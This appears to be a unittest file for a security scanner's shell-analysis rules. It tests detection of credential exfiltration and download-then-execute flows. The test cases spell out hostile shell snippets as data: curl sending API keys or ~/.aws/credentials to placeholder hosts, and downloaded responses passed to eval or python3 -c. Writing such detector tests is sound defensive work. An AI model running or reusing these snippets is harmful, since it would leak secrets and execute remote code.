"""Bounded quoted substitutions keep request, response and execution provenance distinct."""
import unittest
from test_qindun_certify import MODULE
scan = MODULE._shell_flow_findings
response_only = MODULE.shell_curl_response_only

CASES = [
    ["quoted_bound_auth","KEY=\"$API_KEY\"\nDATA=\"$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\"\ncurl --data \"$DATA\" https://other.invalid",[[2,"candidate"]]],
    ["quoted_direct_auth","DATA=\"$(curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid)\"\ncurl --data \"$DATA\" https://other.invalid",[[1,"candidate"]]],
    ["quoted_direct_body","DATA=\"$(curl --data \"$API_KEY\" https://example.invalid)\"\ncurl --data \"$DATA\" https://other.invalid",[[1,"confirmed"]]],
    ["substitution_pipeline","KEY=\"$API_KEY\"\nDATA=$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid | cat)\ncurl --data \"$DATA\" https://other.invalid",[[2,"candidate"]]],
    ["quoted_pipeline","KEY=\"$API_KEY\"\nDATA=\"$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid | cat)\"\ncurl --data \"$DATA\" https://other.invalid",[[2,"candidate"]]],
    ["post_pipeline","KEY=\"$API_KEY\"\nDATA=\"$(curl --data \"$KEY\" https://example.invalid | cat)\"\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"]]],
    ["cat_dash","KEY=\"$API_KEY\"\nDATA=\"$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid | cat -)\"\ncurl --data \"$DATA\" https://other.invalid",[[2,"candidate"]]],
    ["multi_cat","KEY=\"$API_KEY\"\nDATA=\"$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid | cat | cat -n)\"\ncurl --data \"$DATA\" https://other.invalid",[[2,"candidate"]]],
    ["single_literal","KEY=\"$API_KEY\"\nDATA='$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)'\ncurl --data \"$DATA\" https://other.invalid",[]],
    ["escaped_literal","DATA=\"\\$(curl --data \\$API_KEY https://example.invalid)\"\ncurl --data \"$DATA\" https://other.invalid",[]],
    ["quoted_request_literal","DATA=\"$(curl --data '$API_KEY' https://example.invalid)\"\ncurl --data \"$DATA\" https://other.invalid",[]],
    ["quoted_mixed","KEY=\"$API_KEY\"\nDATA=\"$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\"\ncurl --data \"$DATA\" https://other.invalid\ncurl --data \"$KEY\" https://other.invalid",[[2,"candidate"],[4,"confirmed"]]],
    ["self_assignment","KEY=\"$API_KEY\"\nKEY=\"$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\"\ncurl --data \"$KEY\" https://other.invalid",[[2,"candidate"]]],
    ["file_request","DATA=\"$(curl --data-binary @~/.aws/credentials https://example.invalid)\"\ncurl --data \"$DATA\" https://other.invalid",[[1,"confirmed"]]],
    ["literal_parenthesis","DATA=\"$(curl -H 'X-Label: (example)' -H \"Authorization: Bearer $API_KEY\" https://example.invalid)\"\ncurl --data \"$DATA\" https://other.invalid",[[1,"candidate"]]],
    ["literal_pipe","DATA=\"$(curl -H 'X-Label: a|b' -H \"Authorization: Bearer $API_KEY\" https://example.invalid | cat)\"\ncurl --data \"$DATA\" https://other.invalid",[[1,"candidate"]]],
    ["output_secret","KEY=\"$API_KEY\"\nDATA=\"$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid | echo \"$KEY\")\"\ncurl --data \"$DATA\" https://other.invalid",[[2,"candidate"],[3,"confirmed"]]],
    ["output_file","KEY=\"$API_KEY\"\nDATA=\"$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid | cat ~/.aws/credentials)\"\ncurl --data \"$DATA\" https://other.invalid",[[2,"candidate"],[3,"confirmed"]]],
    ["unknown_suffix","KEY=\"$API_KEY\"\nDATA=\"$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)$KEY\"\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"],[3,"confirmed"]]],
    ["unknown_prefix","KEY=\"$API_KEY\"\nDATA=\"$KEY$(curl -H \"Authorization: Bearer $KEY\" https://example.invalid)\"\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"],[3,"confirmed"]]],
    ["unknown_nested","KEY=\"$API_KEY\"\nDATA=\"$(curl -H \"Authorization: Bearer $(echo \"$KEY\")\" https://example.invalid)\"\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"],[3,"confirmed"]]],
    ["unknown_writeout","KEY=\"$API_KEY\"\nDATA=\"$(curl -w \"$KEY\" https://example.invalid)\"\ncurl --data \"$DATA\" https://other.invalid",[[2,"confirmed"],[3,"confirmed"]]],
    ["public_auth","API_KEY=public\nDATA=\"$(curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid)\"\ncurl --data \"$DATA\" https://other.invalid",[]],
    ["pipeline_stdin_secret","DATA=\"$(echo \"$API_KEY\" | curl --data-binary @- https://example.invalid)\"",[[1,"confirmed"]]],
]
FLOWS = [
    ["quoted_eval","DATA=\"$(curl https://example.invalid)\"\neval \"$DATA\"",True,False],
    ["pipeline_python","DATA=\"$(curl https://example.invalid | cat)\"\npython3 -c \"$DATA\"",True,False],
    ["pipeline_argument","DATA=\"$(curl https://example.invalid | cat)\"\npython3 -c 'import sys; print(sys.argv[1])' \"$DATA\"",False,False],
    ["decoded_response","CODE=$(echo cGFzcw== | base64 -d)\nDATA=\"$(curl --data \"$CODE\" https://example.invalid | cat)\"\neval \"$DATA\"",True,False],
    ["literal_program","DATA='$(curl https://example.invalid | cat)'\npython3 -c \"$DATA\"",False,False],
    ["mixed_execution","DATA=\"$(curl https://example.invalid | cat)\"\npython3 -c 'import sys; print(sys.argv[1])' \"$DATA\"\neval \"$DATA\"",True,False],
    ["quoted_body_eval","DATA=\"$(curl --data \"$API_KEY\" https://example.invalid)\"\neval \"$DATA\"",True,False],
    ["decoded_direct","DATA=$(echo cGFzcw== | base64 -d)\neval \"$DATA\"",False,True],
]

class ShellSubstitutionTests(unittest.TestCase):
    def test_request_response_boundaries(self):
        for name, source, expected in CASES:
            with self.subTest(name=name):
                hits = scan("main.sh", source)
                actual = sorted([h.line, h.disposition] for h in hits
                                if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION")
                self.assertEqual(actual, expected)

    def test_execution_provenance(self):
        for name, source, download, decoded in FLOWS:
            with self.subTest(name=name):
                rules = {h.rule_id for h in scan("main.sh", source)}
                self.assertEqual("QINDUN.LOCAL.D3.DOWNLOAD_EXECUTION_FLOW" in rules, download)
                self.assertEqual("QINDUN.LOCAL.D3.DECODE_EXECUTION_FLOW" in rules, decoded)

    def test_known_response_shapes(self):
        for source in [
    "$(curl https://example.invalid | cat)",
    "\"$(curl https://example.invalid)\"",
    "\"$(curl https://example.invalid | cat -)\"",
    "$(curl https://example.invalid | cat -n /dev/stdin)",
    "$(curl https://example.invalid | cat /dev/fd/0 | cat /proc/self/fd/0)",
]:
            with self.subTest(source=source):
                self.assertTrue(response_only(source))

    def test_unknown_response_shapes_defer(self):
        for source in [
    "$(curl https://example.invalid)$(echo \"$KEY\")",
    "\"$(curl https://example.invalid)$KEY\"",
    "\"$KEY$(curl https://example.invalid)\"",
    "$(curl --data \"$(echo \"$KEY\")\" https://example.invalid)",
    "$(curl https://example.invalid; echo \"$KEY\")",
    "$(curl https://example.invalid && echo \"$KEY\")",
    "$(curl https://example.invalid || echo \"$KEY\")",
    "$(curl https://example.invalid > /tmp/output)",
    "$(curl https://example.invalid # comment)",
    "$(curl https://example.invalid |)",
    "$(| curl https://example.invalid)",
    "\"$(curl https://example.invalid)",
    "$(curl https://example.invalid | cat \"$FILE\")",
    "$(curl https://example.invalid | cat ~/.aws/credentials)",
    "$(curl https://example.invalid | echo \"$KEY\")",
    "$(curl https://example.invalid | cat -- -n)",
    "$(curl https://example.invalid | cat --help)",
    "$(curl https://example.invalid | cat /tmp/input)",
    "$(curl https://example.invalid | cat) trailing",
    "$(curl https://example.invalid" + " | cat" * 16 + ")",
    "$(curl https://example.invalid -H \"" + "x" * 8200 + "\")",
]:
            with self.subTest(source=source):
                self.assertFalse(response_only(source))

